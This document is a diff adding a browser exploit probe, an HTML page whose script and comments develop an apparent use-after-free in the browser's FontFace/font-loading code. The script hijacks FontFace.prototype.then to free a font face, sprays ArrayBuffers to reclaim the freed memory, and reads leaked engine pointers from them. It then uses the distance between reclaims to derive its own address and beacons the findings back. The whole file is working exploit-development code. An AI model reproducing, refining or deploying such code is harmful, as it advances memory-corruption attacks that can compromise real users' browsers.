@@ -1,0 +1,220 @@
+<!--
+  p678: multi-hit capture — THE delta probe.
+  Goal: capture TWO engine reclaims (R0 + R2) with their lane-ids in the
+  SAME load. Delta between hit lanes = reclaim distance = the empirical
+  basis for self-address (lane VA from the T leak). Survival past R2 NOT
+  needed — the R2-hit beacon must simply ESCAPE before the R2-window death.
+
+  Base: p673-groom (keepspray, LANE map, float markers 100+round+lane*0.001
+  @+0x44 — decodes WHICH lane got stamped) with deltas:
+    1. NO haze anywhere (24 clean lanes — natural parity: R0 hits lane1,
+       R1 misses, R2 hits; p663/p673 logs prove this cadence).
+    2. ROUNDS = 3 (R0 hit, R1 miss, R2 hit — then whatever happens).
+    3. analyzeEarly at +80ms (not +150): the engine write lands well
+       before +150ms historically (R0 T already stamped at every +150ms
+       beacon), so 80ms is a safe margin to read BEFORE the R2-window
+       death can eat the beacon.
+    4. R-line + LANE beacons flush IMMEDIATELY after each analyzeEarly
+       (not batched to LATE) — the R2 hit line must escape fast.
+    5. Round cadence compressed: next beginRound at +1200ms after
+       analyzeEarly => R2 analyze fires at t~2640ms from load start.
+  LATE pass at +3350ms kept as best-effort (if page dies at R2 window,
+  no loss — the early beacon already escaped).
+
+  WIN LINE: 'P678-R2 hit=...' — lane-id decoded via seed float (owner
+  round r2, lane i => seed 102.000+i*0.001). Then delta = lane2-lane0.
+
+  Beacon: P678-.  CRASH_CLASS: HIGH at R2 window (expected AFTER win).
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p678</title></head>
+<body>p678: multi-hit capture (r3, 80ms analyze)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+}
+function flush() {
+  while (bQ.length) {
+    var b = bQ.splice(0, 2).join('|');
+    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P678-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'multihit r3 80ms');
+flush();
+
+var ROUNDS = 3;
+var round = 0;
+var results = [];
+var gfired = -1;
+
+var sty = null, ff = null;
+var armed = false;
+var spray = [];
+window.__sprayAlive = [];
+var snap1 = null;
+
+var round0Lane = null;
+var round0T = '';
+var hitLanes = [];
+
+function seedLane(dv, i) {
+  /* float marker only — no rc seed, no status seed, NO haze */
+  dv.setFloat32(0x44, 100 + round + i * 0.001, true);
+}
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (!armed) return undefined;
+    armed = false;
+    gfired = round;
+    try { sty.remove(); } catch(e) {}
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    spray = window.__sprayAlive[round] = [];
+    for (var i = 0; i < 24; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      seedLane(dv, i);
+      spray.push(dv);
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+function dumpLane(dv) {
+  var out = [];
+  for (var off = 0; off <= 0xB8; off += 8) {
+    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
+    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
+  }
+  return out.join(',');
+}
+
+function scanHit() {
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
+  }
+  return -1;
+}
+
+/* GROOM MAP: scan ALL live rounds' lanes for engine stamps */
+function groomMap() {
+  for (var r = 0; r <= round && r < window.__sprayAlive.length; r++) {
+    var lanes = window.__sprayAlive[r];
+    if (!lanes) continue;
+    for (var i = 0; i < lanes.length; i++) {
+      var dv = lanes[i];
+      var lo = dv.getUint32(0x58, true), hi = dv.getUint32(0x5C, true);
+      if (lo !== 0 || hi !== 0) {
+        emit('LANE r' + round, 'owner=r' + r + ' lane=' + i +
+             ' seed=' + dv.getFloat32(0x44, true).toFixed(3) +
+             ' T=' + hex32(hi) + hex32(lo) +
+             ' rc=' + dv.getUint32(0x00, true));
+      }
+    }
+  }
+}
+
+function obsR0Lane() {
+  if (!round0Lane) return;
+  try {
+    var tNow = hex32(round0Lane.getUint32(0x5C, true)) + hex32(round0Lane.getUint32(0x58, true));
+    emit('OBS r' + round, 'rc=' + round0Lane.getUint32(0x00, true) +
+         ' st=' + round0Lane.getUint8(0x82) +
+         ' Tsame=' + (tNow === round0T ? 'y' : 'n'));
+  } catch(e) { emit('OBS r' + round, 'ERR ' + String(e).slice(0,60)); }
+}
+
+function trackHit(hit) {
+  var dv = spray[hit];
+  if (round === 0) round0Lane = dv;
+  hitLanes.push({ tag: 'r' + round, dv: dv });
+}
+
+function beginRound() {
+  sty = document.createElement('style');
+  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(sty);
+  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(ff);
+  void ff.loaded;
+  window.__facesAlive = window.__facesAlive || [];
+  window.__facesAlive.push(ff);
+  armed = true;
+  document.fonts.load('1em f' + round + ', s' + round, 'AB');
+  setTimeout(analyzeEarly, 80);      /* beat the R2-window death */
+  setTimeout(analyzeLate, 3350);
+}
+
+function analyzeEarly() {
+  try {
+    obsR0Lane();
+    var hit = scanHit();
+    if (hit < 0) {
+      emit('R' + round, 'MISS gf=' + gfired);
+      results.push({ r: round, lane: -1, t: '-', w: '-' });
+    } else {
+      var dv = spray[hit];
+      snap1 = dumpLane(dv);
+      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
+      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
+      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
+      if (round === 0) round0T = hex32(tHi) + hex32(tLo);
+      trackHit(hit);
+      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
+           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
+           ' st82=' + dv.getUint8(0x82) +
+           ' gf=' + gfired + ' seed=' + dv.getFloat32(0x44, true).toFixed(3));
+      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
+    }
+    groomMap();
+    flush();                          /* IMMEDIATE — R2 line must escape */
+  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
+  /* compressed cadence: next round soon; summary comes from LATE of R2 */
+  if (round + 1 < ROUNDS) {
+    setTimeout(function() { round++; gfired = -1; beginRound(); }, 1200);
+  }
+}
+
+function analyzeLate() {
+  try {
+    obsR0Lane();
+    var hit = scanHit();
+    if (hit >= 0 && spray.length) {
+      var dv = spray[hit];
+      var snap2s = dumpLane(dv);
+      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
+           ' rc=' + dv.getUint32(0x00, true) +
+           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
+      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
+    } else {
+      emit('R' + round + 'LATE', 'alive (miss-round)');
+    }
+    flush();
+    if (round >= ROUNDS - 1) {
+      var lanes = [];
+      for (var k = 0; k < results.length; k++) lanes.push(results[k].lane);
+      emit('SUMMARY', 'multihit rounds=' + results.length +
+           ' lanes=[' + lanes.join(',') + ']');
+      emit('ALIVE', 'end-r3-multihit');
+      flush();
+    }
+  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+setTimeout(beginRound, 50);
+
+})();
+</script>
+</body></html>
